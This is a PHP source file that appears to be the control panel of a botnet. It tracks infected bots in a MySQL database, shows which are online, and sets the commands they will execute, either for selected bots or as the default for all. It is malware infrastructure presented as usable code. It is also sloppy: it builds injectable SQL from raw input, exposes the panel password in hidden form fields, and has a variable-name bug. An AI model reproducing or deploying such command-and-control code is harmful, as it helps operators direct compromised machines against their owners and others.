<?php

//tables,diagramms,charts...
function statistic($Type,$timeout){
    if($Type=='Mini'){ 
        echo '<h3>Mini statistic:</h3>';
        echo 'Bots online:'.BotsOnline($timeout).'<br>Total Bots:';
        $sql="SELECT ID from bots";
        $query=mysql_query($sql) or die('wrong query'.mysql_error());
        $count=mysql_num_rows($query);
        echo $count;}
    if($type=='Maxi'){
         echo '<i>coming soon</i>';}
}

function menu($password){
echo "<table><tr><td>";
echo "<form action='control.php?cat=options' method='POST'>";
$text="<input type='hidden' name='PWD' value=";
$text=$text."'".$password."'>";
echo $text;
echo '<input type="submit" value="Options">';
echo '</form></td><td>';
echo "<form action='control.php?cat=command' method='POST'>";
$text="<input type='hidden' name='PWD' value=";
$text=$text."'".$password."'>";
echo $text;
echo '<input type="submit" value="Command">';
echo '</form></td><td>';
echo "<form action='control.php?cat=Bottable' method='POST'>";
$text="<input type='hidden' name='PWD' value=";
$text=$text."'".$password."'>";
echo $text;
echo '<input type="submit" value="Bottable">';
echo '</form></td>';
}

function BotsOnline($timeout){
       
       $count=0;
       $sql="SELECT `Login` from bots";
       $query=mysql_query($sql) or die('wrong query'.mysql_error());
          while($data=mysql_fetch_array($query)){
              $second=microtime();
              $timestamp=explode(" ",$second);
              $second=microtime();
              $timestamp=explode(" ",$second);
              if ($data['Login']+$timeout>$timestamp[1]){
              $count=$count+1;}}
        return $count;}
       

function SetBotCommand($sql,$command){
$sql=stripslashes($sql);
$a="UPDATE bots SET Command='".$command."  "."' WHERE ".$sql;
$b00l=mysql_query(stripslashes($a)) or die('SetbotCommad:'.mysql_error());
 return $b00l;}
 
function NewBots(){
$date1=date('d');
        $date2=date('m');
         $date3=date('y');
$date=$date1.'.'.$date2.'.'.$date3;
$sql="SELECT ID FROM bots WHERE date='$date'";
$query=mysql_query($sql) or die('wrong query');
$count=mysql_num_rows($query);
echo $count;
}
function SetStandartCommand($command){
$sql="ALTER TABLE `bots` CHANGE `Command` `Command` VARCHAR( 900 ) NOT NULL DEFAULT '".$command."'";
$query=mysql_query($sql) or die('wrong query'.mysql_error());
}

function ShowAllBots($timeout){
$sql="SELECT ID,Date,Command,Login from bots";
$query=mysql_query($sql) or die('wrong query'.mysql_error());
$count=mysql_num_rows($query);
echo '<br>Total bots:';
echo $count;
echo '<br>
       <br>
         <br>';

while($data=mysql_fetch_array($query)){
$b00lONLINE=' style="background-color:#FF0000"';
$second=microtime();
$timestamp=explode(" ",$second);
if ($data[Login]+$timeout>$timestamp[1]){
$b00lONLINE=' style="background-color:#00FF00"';}

echo '<table border=1.5>';
/*echo "<input type='checkbox'
 name='$bots[]'
 value='$data[id]'";*/
echo '<tr '; 
echo $b00lONLINE;
echo '>';
echo '<td>';
echo $data['ID'];
echo '</td><td>';
/*echo $data['Country'];
echo '</td><td>';*/
echo $data['Date'];
echo '</td><td>';
echo $data['Command'];
echo '</td>
</tr>
</table>';}

}

?>